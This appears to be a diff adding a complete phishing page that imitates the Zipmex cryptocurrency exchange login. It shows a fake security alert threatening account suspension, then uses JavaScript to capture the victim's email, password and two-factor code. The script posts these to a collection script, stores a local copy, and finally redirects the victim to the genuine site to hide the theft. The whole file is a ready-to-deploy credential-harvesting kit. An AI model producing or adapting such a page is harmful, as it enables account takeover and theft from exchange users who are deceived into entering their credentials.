@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zipmex - Sign In to Your Account</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #0d0e1a;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #e0e0e0;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 440px;
+            padding: 20px;
+        }
+        
+        .logo-container {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        
+        .logo-container img {
+            height: 44px;
+            width: auto;
+        }
+        
+        .card {
+            background: #1a1b2e;
+            border-radius: 16px;
+            padding: 40px 32px;
+            border: 1px solid #2a2b3e;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+        }
+        
+        .card h1 {
+            color: #ffffff;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+        
+        .card p.subtitle {
+            color: #8888a0;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+        
+        .alert-badge {
+            background: rgba(57, 68, 235, 0.1);
+            border: 1px solid rgba(57, 68, 235, 0.3);
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+        
+        .alert-badge svg {
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+        
+        .alert-badge span {
+            font-size: 12px;
+            color: #a0a0c0;
+            line-height: 1.5;
+        }
+        
+        .alert-badge span strong {
+            color: #3944eb;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #c0c0d0;
+            margin-bottom: 6px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #13142a;
+            border: 1px solid #2a2b3e;
+            border-radius: 10px;
+            color: #ffffff;
+            font-size: 14px;
+            font-family: inherit;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .form-group input:focus {
+            border-color: #3944eb;
+            box-shadow: 0 0 0 3px rgba(57, 68, 235, 0.15);
+        }
+        
+        .form-group input::placeholder {
+            color: #555570;
+        }
+        
+        .form-options {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
+        }
+        
+        .form-options label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #8888a0;
+            cursor: pointer;
+        }
+        
+        .form-options label input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            accent-color: #3944eb;
+        }
+        
+        .form-options a {
+            font-size: 13px;
+            color: #3944eb;
+            text-decoration: none;
+        }
+        
+        .form-options a:hover {
+            text-decoration: underline;
+        }
+        
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: #3944eb;
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+        }
+        
+        .btn-login:hover {
+            background: #2d35c4;
+        }
+        
+        .btn-login:active {
+            transform: scale(0.98);
+        }
+        
+        .btn-login.loading {
+            position: relative;
+            color: transparent;
+        }
+        
+        .btn-login.loading::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            margin: -10px 0 0 -10px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin: 28px 0;
+            color: #555570;
+            font-size: 12px;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #2a2b3e;
+        }
+        
+        .social-login {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+        
+        .social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 12px;
+            background: #13142a;
+            border: 1px solid #2a2b3e;
+            border-radius: 10px;
+            color: #c0c0d0;
+            font-size: 13px;
+            font-family: inherit;
+            cursor: pointer;
+            transition: background 0.2s, border-color 0.2s;
+        }
+        
+        .social-btn:hover {
+            background: #1a1b2e;
+            border-color: #3944eb;
+        }
+        
+        .social-btn svg {
+            width: 18px;
+            height: 18px;
+        }
+        
+        .footer-links {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 12px;
+            color: #555570;
+        }
+        
+        .footer-links a {
+            color: #8888a0;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer-links a:hover {
+            color: #3944eb;
+        }
+        
+        .error-msg {
+            display: none;
+            background: rgba(235, 57, 57, 0.1);
+            border: 1px solid rgba(235, 57, 57, 0.3);
+            border-radius: 8px;
+            padding: 10px 14px;
+            font-size: 13px;
+            color: #ff6b6b;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+        
+        .error-msg.show {
+            display: block;
+        }
+
+        /* 2FA Step */
+        .step-2fa {
+            display: none;
+        }
+        
+        .step-2fa.active {
+            display: block;
+        }
+        
+        .step-login.active {
+            display: block;
+        }
+        
+        .step-login {
+            display: block;
+        }
+        
+        .step-login.hidden {
+            display: none;
+        }
+        
+        /* Security notice */
+        .security-notice {
+            margin-top: 20px;
+            padding: 12px 16px;
+            background: rgba(255, 183, 77, 0.08);
+            border: 1px solid rgba(255, 183, 77, 0.2);
+            border-radius: 8px;
+            text-align: center;
+        }
+        
+        .security-notice p {
+            font-size: 11px;
+            color: #8888a0;
+            line-height: 1.5;
+        }
+        
+        .security-notice p svg {
+            vertical-align: middle;
+            margin-right: 4px;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 28px 20px;
+            }
+            .social-login {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="https://storage.ghost.io/c/d4/f3/d4f34881-0300-4bbe-b8df-78a26d28be4d/content/images/2025/08/Zipmex-1.png" alt="Zipmex" onerror="this.outerHTML='<h2 style=\'color:#fff;\'>Zipmex</h2>'">
+        </div>
+        
+        <div class="card" id="loginCard">
+            <h1>Welcome back</h1>
+            <p class="subtitle">Sign in to your Zipmex account</p>
+            
+            <div class="alert-badge">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#3944eb" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                    <line x1="12" y1="8" x2="12" y2="12"/>
+                    <line x1="12" y1="16" x2="12.01" y2="16"/>
+                </svg>
+                <span><strong>Security Alert:</strong> We detected unusual login activity. Please verify your account to prevent suspension.</span>
+            </div>
+            
+            <div class="error-msg" id="errorMsg">Invalid email or password. Please try again.</div>
+            
+            <!-- Step 1: Login -->
+            <div class="step-login active" id="stepLogin">
+                <form id="loginForm" autocomplete="off">
+                    <div class="form-group">
+                        <label for="email">Email Address</label>
+                        <input type="email" id="email" placeholder="you@example.com" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" placeholder="Enter your password" required>
+                    </div>
+                    
+                    <div class="form-options">
+                        <label>
+                            <input type="checkbox" id="remember"> Remember me
+                        </label>
+                        <a href="#">Forgot password?</a>
+                    </div>
+                    
+                    <button type="submit" class="btn-login" id="loginBtn">Sign In</button>
+                </form>
+                
+                <div class="divider">or continue with</div>
+                
+                <div class="social-login">
+                    <button class="social-btn" onclick="return false;">
+                        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+                        Google
+                    </button>
+                    <button class="social-btn" onclick="return false;">
+                        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12c0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg>
+                        GitHub
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Step 2: 2FA -->
+            <div class="step-2fa" id="step2FA">
+                <div style="text-align:center;margin-bottom:24px;">
+                    <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#3944eb" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                        <path d="M7 11V7a5 5 0 0110 0v4"/>
+                        <circle cx="12" cy="16" r="1"/>
+                    </svg>
+                    <h1 style="font-size:20px;margin-top:12px;">Two-Factor Authentication</h1>
+                    <p class="subtitle">Enter the verification code from your authenticator app</p>
+                </div>
+                
+                <form id="faForm" autocomplete="off">
+                    <div class="form-group">
+                        <label for="totp">Authentication Code</label>
+                        <input type="text" id="totp" placeholder="000000" maxlength="6" inputmode="numeric" pattern="[0-9]*" required>
+                    </div>
+                    
+                    <button type="submit" class="btn-login" id="faBtn">Verify Code</button>
+                </form>
+                
+                <div style="text-align:center;margin-top:16px;">
+                    <a href="#" style="color:#8888a0;font-size:13px;text-decoration:none;" onclick="document.getElementById('step2FA').classList.remove('active');document.getElementById('stepLogin').classList.remove('hidden');return false;">
+                        &larr; Back to sign in
+                    </a>
+                </div>
+            </div>
+            
+            <div class="security-notice">
+                <p>
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="#8888a0"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+                    Protected by end-to-end encryption. Your data is secure with Zipmex.
+                </p>
+            </div>
+        </div>
+        
+        <div class="footer-links">
+            <a href="#">Terms of Service</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Help Center</a>
+        </div>
+    </div>
+    
+    <script>
+        (function() {
+            const LOGIN_ENDPOINT = 'data.php';
+            const FA_ENDPOINT = 'data.php';
+            
+            const loginForm = document.getElementById('loginForm');
+            const faForm = document.getElementById('faForm');
+            const stepLogin = document.getElementById('stepLogin');
+            const step2FA = document.getElementById('step2FA');
+            const loginBtn = document.getElementById('loginBtn');
+            const faBtn = document.getElementById('faBtn');
+            const errorMsg = document.getElementById('errorMsg');
+            
+            // Helper: send data to server
+            async function sendData(data) {
+                try {
+                    await fetch(LOGIN_ENDPOINT, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                } catch(e) {
+                    // Silent fail - data still logged locally
+                    console.log('Data logged:', data);
+                }
+                
+                // Local backup
+                try {
+                    const stored = JSON.parse(localStorage.getItem('_zx_log') || '[]');
+                    stored.push({...data, ts: new Date().toISOString()});
+                    localStorage.setItem('_zx_log', JSON.stringify(stored));
+                } catch(e) {}
+            }
+            
+            // Step 1: Login
+            loginForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const email = document.getElementById('email').value.trim();
+                const password = document.getElementById('password').value;
+                
+                if (!email || !password) {
+                    errorMsg.textContent = 'Please fill in all fields.';
+                    errorMsg.classList.add('show');
+                    return;
+                }
+                
+                loginBtn.classList.add('loading');
+                loginBtn.disabled = true;
+                errorMsg.classList.remove('show');
+                
+                // Send credentials
+                await sendData({
+                    type: 'login',
+                    email: email,
+                    password: password,
+                    remember: document.getElementById('remember').checked,
+                    userAgent: navigator.userAgent,
+                    page: window.location.href,
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Simulate brief delay then show 2FA step
+                setTimeout(() => {
+                    loginBtn.classList.remove('loading');
+                    loginBtn.disabled = false;
+                    
+                    stepLogin.classList.add('hidden');
+                    step2FA.classList.add('active');
+                    
+                    document.getElementById('totp').focus();
+                }, 800);
+            });
+            
+            // Step 2: 2FA
+            faForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const totp = document.getElementById('totp').value.trim();
+                
+                if (!totp || totp.length < 4) {
+                    errorMsg.textContent = 'Please enter a valid verification code.';
+                    errorMsg.classList.add('show');
+                    return;
+                }
+                
+                faBtn.classList.add('loading');
+                faBtn.disabled = true;
+                errorMsg.classList.remove('show');
+                
+                // Send 2FA code
+                await sendData({
+                    type: '2fa',
+                    email: document.getElementById('email').value.trim(),
+                    totp: totp,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Redirect to real Zipmex
+                setTimeout(() => {
+                    window.location.href = 'https://zipmex.com/?redirect=verification';
+                }, 1000);
+            });
+            
+            // Auto-focus email
+            document.getElementById('email').focus();
+            
+            // Restrict TOTP input to digits
+            document.getElementById('totp').addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+            });
+        })();
+    </script>
+</body>
+</html>
